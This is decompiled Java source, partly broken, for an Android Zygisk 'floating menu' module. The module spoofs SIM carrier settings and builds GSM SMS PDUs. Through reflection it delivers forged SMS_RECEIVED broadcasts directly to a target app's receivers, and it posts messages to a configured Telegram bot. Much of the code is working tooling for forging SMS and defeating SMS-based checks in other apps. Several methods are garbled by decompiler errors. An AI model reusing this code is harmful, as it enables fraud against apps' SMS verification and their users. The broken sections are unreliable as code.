                    localSocket = null;
                    th = th4;
                }
                try {
                    localSocket.close();
                } catch (Exception unused2) {
                }
            }
        }).start();
    }

    /* JADX WARN: Removed duplicated region for block: B:19:0x0061  */
    /* JADX WARN: Removed duplicated region for block: B:21:0x006f A[RETURN] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static String loadLicenseKey() {
        LocalSocket localSocket;
        String readLine;
        LocalSocket localSocket2 = null;
        try {
            try {
                localSocket = new LocalSocket();
                try {
                    localSocket.connect(new LocalSocketAddress("zygisk_menu_socket"));
                    localSocket.setSoTimeout(3000);
                    OutputStream outputStream = localSocket.getOutputStream();
                    outputStream.write("GET_LICENSE\n".getBytes("UTF-8"));
                    outputStream.flush();
                    readLine = new BufferedReader(new InputStreamReader(localSocket.getInputStream(), "UTF-8")).readLine();
                } catch (Throwable th) {
                    th = th;
                    localSocket2 = localSocket;
                    try {
                        Log.e(TAG_MENU, "Error loading license key via socket, falling back to SharedPreferences", th);
                        if (localSocket2 != null) {
                            localSocket2.close();
                        }
                        Context systemContext = getSystemContext();
                        if (systemContext == null) {
                        }
                    } catch (Throwable th2) {
                        if (localSocket2 != null) {
                            try {
                                localSocket2.close();
                            } catch (Throwable unused) {
                            }
                        }
                        throw th2;
                    }
                }
            } catch (Throwable unused2) {
            }
        } catch (Throwable th3) {
            th = th3;
        }
        if (readLine != null) {
            String trim = readLine.trim();
            try {
                localSocket.close();
            } catch (Throwable unused3) {
            }
            return trim;
        }
        localSocket.close();
        Context systemContext2 = getSystemContext();
        return systemContext2 == null ? systemContext2.getSharedPreferences("zygisk_menu_prefs", 0).getString("license_key", "") : "";
    }

    public static String[] loadSimSettingsEx() {
        LocalSocket localSocket = null;
        try {
            try {
                LocalSocket localSocket2 = new LocalSocket();
                try {
                    localSocket2.connect(new LocalSocketAddress("zygisk_menu_socket"));
                    localSocket2.setSoTimeout(3000);
                    OutputStream outputStream = localSocket2.getOutputStream();
                    outputStream.write("GET_SIM_SETTINGS\n".getBytes("UTF-8"));
                    outputStream.flush();
                    String readLine = new BufferedReader(new InputStreamReader(localSocket2.getInputStream(), "UTF-8")).readLine();
                    if (readLine != null && readLine.contains("|")) {
                        String[] split = readLine.split("\\|", -1);
                        if (split.length >= 6) {
                            try {
                                localSocket2.close();
                            } catch (Throwable unused) {
                            }
                            return split;
                        }
                    }
                    localSocket2.close();
                } catch (Throwable th) {
                    th = th;
                    localSocket = localSocket2;
                    try {
                        Log.e(TAG_MENU, "Error loading SIM settings via socket", th);
                        if (localSocket != null) {
                            localSocket.close();
                        }
                        return new String[]{"false", "jio", "", "false", "jio", "", "in"};
                    } catch (Throwable th2) {
                        if (localSocket != null) {
                            try {
                                localSocket.close();
                            } catch (Throwable unused2) {
                            }
                        }
                        throw th2;
                    }
                }
            } catch (Throwable unused3) {
                return new String[]{"false", "jio", "", "false", "jio", "", "in"};
            }
        } catch (Throwable th3) {
            th = th3;
        }
    }

    /*  JADX ERROR: JadxRuntimeException in pass: RegionMakerVisitor
        jadx.core.utils.exceptions.JadxRuntimeException: Can't find top splitter block for handler:B:30:0x0065
        	at jadx.core.utils.BlockUtils.getTopSplitterForHandler(BlockUtils.java:1166)
        	at jadx.core.dex.visitors.regions.RegionMaker.processTryCatchBlocks(RegionMaker.java:1022)
        	at jadx.core.dex.visitors.regions.RegionMakerVisitor.visit(RegionMakerVisitor.java:55)
        */
    public static java.lang.String[] loadTelegramConfig() {
        /*
            java.lang.String r0 = "UTF-8"
            r1 = 1
            r2 = 2
            r3 = 0
            r4 = 0
            android.net.LocalSocket r5 = new android.net.LocalSocket     // Catch: java.lang.Throwable -> L67
            r5.<init>()     // Catch: java.lang.Throwable -> L67
            android.net.LocalSocketAddress r4 = new android.net.LocalSocketAddress     // Catch: java.lang.Throwable -> L5e
            java.lang.String r6 = "zygisk_menu_socket"
            r4.<init>(r6)     // Catch: java.lang.Throwable -> L5e
            r5.connect(r4)     // Catch: java.lang.Throwable -> L5e
            r4 = 3000(0xbb8, float:4.204E-42)
            r5.setSoTimeout(r4)     // Catch: java.lang.Throwable -> L5e
            java.io.OutputStream r4 = r5.getOutputStream()     // Catch: java.lang.Throwable -> L5e
            java.lang.String r6 = "GET_CONFIG\n"
            byte[] r6 = r6.getBytes(r0)     // Catch: java.lang.Throwable -> L5e
            r4.write(r6)     // Catch: java.lang.Throwable -> L5e
            r4.flush()     // Catch: java.lang.Throwable -> L5e
            java.io.BufferedReader r4 = new java.io.BufferedReader     // Catch: java.lang.Throwable -> L5e
            java.io.InputStreamReader r6 = new java.io.InputStreamReader     // Catch: java.lang.Throwable -> L5e
            java.io.InputStream r7 = r5.getInputStream()     // Catch: java.lang.Throwable -> L5e
            r6.<init>(r7, r0)     // Catch: java.lang.Throwable -> L5e
            r4.<init>(r6)     // Catch: java.lang.Throwable -> L5e
            java.lang.String r0 = r4.readLine()     // Catch: java.lang.Throwable -> L5e
            if (r0 == 0) goto L61
            java.lang.String r4 = "|"
            boolean r4 = r0.contains(r4)     // Catch: java.lang.Throwable -> L5e
            if (r4 == 0) goto L61
            java.lang.String r4 = "\\|"
            r6 = -1
            java.lang.String[] r0 = r0.split(r4, r6)     // Catch: java.lang.Throwable -> L5e
            int r4 = r0.length     // Catch: java.lang.Throwable -> L5e
            if (r4 < r2) goto L61
            java.lang.String[] r4 = new java.lang.String[r2]     // Catch: java.lang.Throwable -> L5e
            r6 = r0[r3]     // Catch: java.lang.Throwable -> L5e
            r4[r3] = r6     // Catch: java.lang.Throwable -> L5e
            r0 = r0[r1]     // Catch: java.lang.Throwable -> L5e
            r4[r1] = r0     // Catch: java.lang.Throwable -> L5e
            r5.close()     // Catch: java.lang.Throwable -> L5d
        L5d:
            return r4
        L5e:
            r0 = move-exception
            r4 = r5
            goto L68
        L61:
            r5.close()     // Catch: java.lang.Throwable -> L65
            goto L74
        L65:
            goto L74
        L67:
            r0 = move-exception
        L68:
            java.lang.String r5 = "zygisk_floating_menu"
            java.lang.String r6 = "Error loading Telegram config via socket, falling back to SharedPreferences"
            android.util.Log.e(r5, r6, r0)     // Catch: java.lang.Throwable -> L9c
            if (r4 == 0) goto L74
            r4.close()     // Catch: java.lang.Throwable -> L65
        L74:
            android.content.Context r0 = getSystemContext()
            java.lang.String r4 = ""
            if (r0 == 0) goto L95
            java.lang.String r5 = "zygisk_menu_prefs"
            android.content.SharedPreferences r0 = r0.getSharedPreferences(r5, r3)
            java.lang.String r5 = "tg_token"
            java.lang.String r5 = r0.getString(r5, r4)
            java.lang.String r6 = "tg_chat_id"
            java.lang.String r0 = r0.getString(r6, r4)
            java.lang.String[] r2 = new java.lang.String[r2]
            r2[r3] = r5
            r2[r1] = r0
            return r2
        L95:
            java.lang.String[] r0 = new java.lang.String[r2]
            r0[r3] = r4
            r0[r1] = r4
            return r0
        L9c:
            r0 = move-exception
            if (r4 == 0) goto La2
            r4.close()     // Catch: java.lang.Throwable -> La2
        La2:
            throw r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.floatingmenu.FloatingMenu.loadTelegramConfig():java.lang.String[]");
    }

    private static byte[] pack7bit(String str) {
        int length = str.length();
        byte[] bArr = new byte[((length * 7) + 7) / 8];
        int i = 0;
        for (int i2 = 0; i2 < length; i2++) {
            int charAt = str.charAt(i2) & 127;
            int i3 = i / 8;
            int i4 = i % 8;
            bArr[i3] = (byte) (bArr[i3] | (charAt << i4));
            if (i4 > 1) {
                int i5 = i3 + 1;
                bArr[i5] = (byte) ((charAt >>> (8 - i4)) | bArr[i5]);
            }
            i += 7;
        }
        return bArr;
    }

    private static byte[] packSeptets(byte[] bArr) {
        byte[] bArr2 = new byte[((bArr.length * 7) + 7) / 8];
        int i = 0;
        for (byte b : bArr) {
            int i2 = b & Byte.MAX_VALUE;
            int i3 = i / 8;
            int i4 = i % 8;
            bArr2[i3] = (byte) (bArr2[i3] | (i2 << i4));
            if (i4 > 1) {
                int i5 = i3 + 1;
                bArr2[i5] = (byte) ((i2 >>> (8 - i4)) | bArr2[i5]);
            }
            i += 7;
        }
        return bArr2;
    }

    public static boolean saveSimSettingsEx(boolean z, String str, String str2, boolean z2, String str3, String str4) {
        return saveSimSettingsEx(z, str, str2, z2, str3, str4, "in", false, false);
    }

    public static boolean saveSimSettingsEx(boolean z, String str, String str2, boolean z2, String str3, String str4, String str5) {
        return saveSimSettingsEx(z, str, str2, z2, str3, str4, str5, false, false);
    }

    public static boolean saveSimSettingsEx(boolean z, String str, String str2, boolean z2, String str3, String str4, String str5, boolean z3) {
        return saveSimSettingsEx(z, str, str2, z2, str3, str4, str5, z3, false);
    }

    public static boolean saveSimSettingsEx(boolean z, String str, String str2, boolean z2, String str3, String str4, String str5, boolean z3, boolean z4) {
        return saveSimSettingsEx(z, str, str2, z2, str3, str4, str5, z3, z4, false);
    }

    public static boolean saveSimSettingsEx(boolean z, String str, String str2, boolean z2, String str3, String str4, String str5, boolean z3, boolean z4, boolean z5) {
        MenuLoader.updateMockSimSettingsEx3(z, str, str2, z2, str3, str4, str5, z3, z4, z5);
        LocalSocket localSocket = null;
        try {
            LocalSocket localSocket2 = new LocalSocket();
            try {
                localSocket2.connect(new LocalSocketAddress("zygisk_menu_socket"));
                localSocket2.setSoTimeout(3000);
                OutputStream outputStream = localSocket2.getOutputStream();
                outputStream.write(("SET_SIM_SETTINGS|" + z + "|" + str + "|" + str2 + "|" + z2 + "|" + str3 + "|" + str4 + "|" + str5 + "|" + z3 + "|" + z4 + "|" + z5 + "\n").getBytes("UTF-8"));
                outputStream.flush();
                boolean equals = "OK".equals(new BufferedReader(new InputStreamReader(localSocket2.getInputStream(), "UTF-8")).readLine());
                try {
                    localSocket2.close();
                } catch (Throwable unused) {
                }
                return equals;
            } catch (Throwable th) {
                th = th;
                localSocket = localSocket2;
                try {
                    Log.e(TAG_MENU, "Error saving SIM settings via socket", th);
                    if (localSocket == null) {
                        return false;
                    }
                    try {
                        localSocket.close();
                        return false;
                    } catch (Throwable unused2) {
                        return false;
                    }
                } catch (Throwable th2) {
                    if (localSocket != null) {
                        try {
                            localSocket.close();
                        } catch (Throwable unused3) {
                        }
                    }
                    throw th2;
                }
            }
        } catch (Throwable th3) {
            th = th3;
        }
    }

    public static boolean saveTelegramConfig(String str, String str2) {
        Context systemContext = getSystemContext();
        if (systemContext != null) {
            systemContext.getSharedPreferences("zygisk_menu_prefs", 0).edit().putString("tg_token", str).putString("tg_chat_id", str2).apply();
        }
        LocalSocket localSocket = null;
        try {
            LocalSocket localSocket2 = new LocalSocket();
            try {
                localSocket2.connect(new LocalSocketAddress("zygisk_menu_socket"));
                localSocket2.setSoTimeout(3000);
                OutputStream outputStream = localSocket2.getOutputStream();
                outputStream.write(("SET_CONFIG|" + str + "|" + str2 + "\n").getBytes("UTF-8"));
                outputStream.flush();
                boolean equals = "OK".equals(new BufferedReader(new InputStreamReader(localSocket2.getInputStream(), "UTF-8")).readLine());
                try {
                    localSocket2.close();
                } catch (Throwable unused) {
                }
                return equals;
            } catch (Throwable th) {
                th = th;
                localSocket = localSocket2;
                try {
                    Log.e(TAG_MENU, "Error saving Telegram config to socket server", th);
                    if (localSocket == null) {
                        return true;
                    }
                    try {
                        localSocket.close();
                        return true;
                    } catch (Throwable unused2) {
                        return true;
                    }
                } catch (Throwable th2) {
                    if (localSocket != null) {
                        try {
                            localSocket.close();
                        } catch (Throwable unused3) {
                        }
                    }
                    throw th2;
                }
            }
        } catch (Throwable th3) {
            th = th3;
        }
    }

    public static void sendTelegramMessageAsync(final String str, final String str2, final String str3) {
        if (str == null || str.isEmpty() || str2 == null || str2.isEmpty() || str3 == null || str3.isEmpty()) {
            return;
        }
        new Thread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.5
            @Override // java.lang.Runnable
            public void run() {
                HttpURLConnection httpURLConnection;
                HttpURLConnection httpURLConnection2 = null;
                try {
                    httpURLConnection = (HttpURLConnection) new URL("https://api.telegram.org/bot" + str + "/sendMessage").openConnection();
                } catch (Throwable th) {
                    th = th;
                }
                try {
                    httpURLConnection.setRequestMethod("POST");
                    httpURLConnection.setDoOutput(true);
                    httpURLConnection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
                    String str4 = "{\"chat_id\":\"" + str2 + "\",\"text\":\"" + str3.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "") + "\",\"parse_mode\":\"HTML\"}";
                    OutputStream outputStream = httpURLConnection.getOutputStream();
                    outputStream.write(str4.getBytes("UTF-8"));
                    outputStream.flush();
                    outputStream.close();
                    Log.d("ZygiskMenu @Hivirtus", "Telegram send response code: " + httpURLConnection.getResponseCode());
                    httpURLConnection.disconnect();
                } catch (Throwable th2) {
                    th = th2;
                    httpURLConnection2 = httpURLConnection;
                    try {
                        Log.e("ZygiskMenu @Hivirtus", "Failed to send Telegram message", th);
                    } finally {
                        if (httpURLConnection2 != null) {
                            httpURLConnection2.disconnect();
                        }
                    }
                }
            }
        }).start();
    }

    public static void show(Activity activity) {
        if (activity == null) {
            return;
        }
        activity.runOnUiThread(new AnonymousClass1(activity));
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static void showToast(Context context, String str) {
        Toast.makeText(context, str, 0).show();
    }

    private static byte[] stringToGsm7BitSeptets(String str) {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        for (int i = 0; i < str.length(); i++) {
            char charAt = str.charAt(i);
            if (charAt == '[') {
                byteArrayOutputStream.write(27);
                charAt = '<';
            } else if (charAt == ']') {
                byteArrayOutputStream.write(27);
                charAt = '>';
            } else if (charAt == '{') {
                byteArrayOutputStream.write(27);
                charAt = '(';
            } else if (charAt == '}') {
                byteArrayOutputStream.write(27);
                charAt = ')';
            } else if (charAt == '\\') {
                byteArrayOutputStream.write(27);
                charAt = '/';
            } else if (charAt == '~') {
                byteArrayOutputStream.write(27);
                charAt = '=';
            } else {
                if (charAt == '|') {
                    byteArrayOutputStream.write(27);
                    byteArrayOutputStream.write(64);
                } else if (charAt == '^') {
                    byteArrayOutputStream.write(27);
                    charAt = 20;
                } else if (charAt == 8364) {
                    byteArrayOutputStream.write(27);
                    charAt = 'e';
                } else if (charAt == '@') {
                    byteArrayOutputStream.write(0);
                } else if (charAt == 163) {
                    charAt = 1;
                } else if (charAt == '$') {
                    charAt = 2;
                } else if (charAt == 165) {
                    charAt = 3;
                } else if (charAt == 232) {
                    charAt = 4;
                } else if (charAt == 233) {
                    charAt = 5;
                } else if (charAt == 249) {
                    charAt = 6;
                } else if (charAt == 236) {
                    charAt = 7;
                } else if (charAt == 242) {
                    charAt = '\b';
                } else if (charAt == 199) {
                    charAt = '\t';
                } else {
                    int i2 = 10;
                    if (charAt != '\n') {
                        if (charAt == 216) {
                            charAt = 11;
                        } else if (charAt == 248) {
                            charAt = '\f';
                        } else {
                            i2 = 13;
                            if (charAt != '\r') {
                                if (charAt == 197) {
                                    charAt = 14;
                                } else if (charAt == 229) {
                                    charAt = 15;
                                } else {
                                    i2 = 95;
                                    if (charAt == '_') {
                                        charAt = 17;
                                    } else if (charAt == 198) {
                                        charAt = 28;
                                    } else if (charAt == 230) {
                                        charAt = 29;
                                    } else if (charAt == 223) {
                                        charAt = 30;
                                    } else if (charAt == 201) {
                                        charAt = 31;
                                    } else if (charAt == 196) {
                                        byteArrayOutputStream.write(91);
                                    } else if (charAt == 214) {
                                        byteArrayOutputStream.write(92);
                                    } else if (charAt == 209) {
                                        byteArrayOutputStream.write(93);
                                    } else if (charAt == 220) {
                                        byteArrayOutputStream.write(94);
                                    } else if (charAt != 167) {
                                        if (charAt == 228) {
                                            byteArrayOutputStream.write(123);
                                        } else if (charAt == 246) {
                                            byteArrayOutputStream.write(124);
                                        } else if (charAt == 241) {
                                            byteArrayOutputStream.write(125);
                                        } else if (charAt == 252) {
                                            byteArrayOutputStream.write(126);
                                        } else if (charAt == 224) {
                                            charAt = 127;
                                        } else if (charAt < ' ' || charAt > '~') {
                                            charAt = '?';
                                        }
                                    }
                                }
                            }
                        }
                    }
                    byteArrayOutputStream.write(i2);
                }
            }
            byteArrayOutputStream.write(charAt);
        }
        return byteArrayOutputStream.toByteArray();
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r2v0, types: [java.lang.Object[], java.io.Serializable] */
    public static void triggerLocalSmsBroadcast(Context context, String str, String str2) {
        String str3;
        try {
            injectSmsSystemWideAsync(str, str2);
            byte[] createSmsPdu = createSmsPdu(str, str2);
            if (createSmsPdu != null && createSmsPdu.length != 0) {
                final Intent intent = new Intent("android.provider.Telephony.SMS_RECEIVED");
                boolean z = false;
                intent.putExtra("pdus", (Serializable) new Object[]{createSmsPdu});
                intent.putExtra("format", "3gpp");
                Class<?> cls = Class.forName("android.app.ActivityThread");
                Method declaredMethod = cls.getDeclaredMethod("currentActivityThread", new Class[0]);
                declaredMethod.setAccessible(true);
                Object invoke = declaredMethod.invoke(null, new Object[0]);
                if (invoke == null) {
                    showToast(context, "ActivityThread not found");
                    return;
                }
                Field declaredField = cls.getDeclaredField("mPackages");
                declaredField.setAccessible(true);
                Map map = (Map) declaredField.get(invoke);
                if (map != null) {
                    Iterator it = map.values().iterator();
                    while (it.hasNext()) {
                        Object obj = ((WeakReference) it.next()).get();
                        if (obj != null) {
                            Field declaredField2 = Class.forName("android.app.LoadedApk").getDeclaredField("mReceivers");
                            declaredField2.setAccessible(true);
                            Map map2 = (Map) declaredField2.get(obj);
                            if (map2 != null) {
                                for (Map.Entry entry : map2.entrySet()) {
                                    final Context context2 = (Context) entry.getKey();
                                    Map map3 = (Map) entry.getValue();
                                    if (map3 != null) {
                                        for (final BroadcastReceiver broadcastReceiver : map3.keySet()) {
                                            if (broadcastReceiver != null) {
                                                if (context instanceof Activity) {
                                                    ((Activity) context).runOnUiThread(new Runnable() { // from class: com.floatingmenu.FloatingMenu.2
                                                        @Override // java.lang.Runnable
                                                        public void run() {
                                                            try {
                                                                broadcastReceiver.onReceive(context2, intent);
                                                            } catch (Throwable th) {
                                                                Log.e(FloatingMenu.TAG_MENU, "Error in onReceive", th);
                                                            }
                                                        }
                                                    });
                                                } else {
                                                    new Handler(Looper.getMainLooper()).post(new Runnable() { // from class: com.floatingmenu.FloatingMenu.3
                                                        @Override // java.lang.Runnable
                                                        public void run() {
                                                            try {
                                                                broadcastReceiver.onReceive(context2, intent);
                                                            } catch (Throwable th) {
                                                                Log.e(FloatingMenu.TAG_MENU, "Error in onReceive", th);
                                                            }
                                                        }
                                                    });
                                                }
                                                z = true;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                    if (z) {
                        str3 = "Local SMS injected successfully!";
                        showToast(context, str3);
                        return;
                    }
                }
                str3 = "No active receivers found in memory.";
                showToast(context, str3);
                return;
            }
            showToast(context, "Failed to generate SMS PDU");
        } catch (Throwable th) {
            showToast(context, "Failed: " + th.getMessage());
            Log.e(TAG_MENU, "Exception in triggerLocalSmsBroadcast", th);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static void updateSelector(LinearLayout linearLayout, String str) {
        if (linearLayout == null || str == null) {
            return;
        }
        String[] strArr = {"jio", "airtel", "vi", "bsnl"};
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(-2937041);
        gradientDrawable.setCornerRadius(dpToPx(linearLayout.getContext(), 6.0f));
        GradientDrawable gradientDrawable2 = new GradientDrawable();
        gradientDrawable2.setColor(-14735049);
        gradientDrawable2.setCornerRadius(dpToPx(linearLayout.getContext(), 6.0f));
        for (int i = 0; i < linearLayout.getChildCount() && i < 4; i++) {
            View childAt = linearLayout.getChildAt(i);
            if (childAt instanceof Button) {
                Button button = (Button) childAt;
                if (strArr[i].equalsIgnoreCase(str)) {
                    button.setBackground(gradientDrawable);
                } else {
                    button.setBackground(gradientDrawable2);
                }
            }
        }
    }
}
